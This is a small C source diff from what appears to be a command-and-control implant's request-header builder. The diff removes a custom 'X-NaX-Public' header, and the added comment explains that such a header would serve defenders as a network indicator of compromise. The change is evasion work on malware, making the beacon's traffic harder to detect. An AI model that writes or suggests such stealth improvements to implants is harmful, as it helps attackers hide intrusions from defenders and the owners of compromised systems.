@@ -165,9 +165,8 @@ FUNC VOID NaxBuildRequestHeaders( PNAX_INSTANCE Nax, const PCHAR sid, const PCHA
         wi = NaxAppendCRLF( out, wi, out_cap );
     }
 
-    CHAR hdr_p[] = { 'X','-','N','a','X','-','P','u','b','l','i','c',':',' ','1','\0' };
-    wi = NaxAppendAsciiW( hdr_p, out, wi, out_cap );
-    wi = NaxAppendCRLF( out, wi, out_cap );
+    /* No extra fixed headers: any beacon-specific header on every request is
+     * a free wire IOC (the listener never reads one). */
 
     out[ wi ] = L'\0';
 }
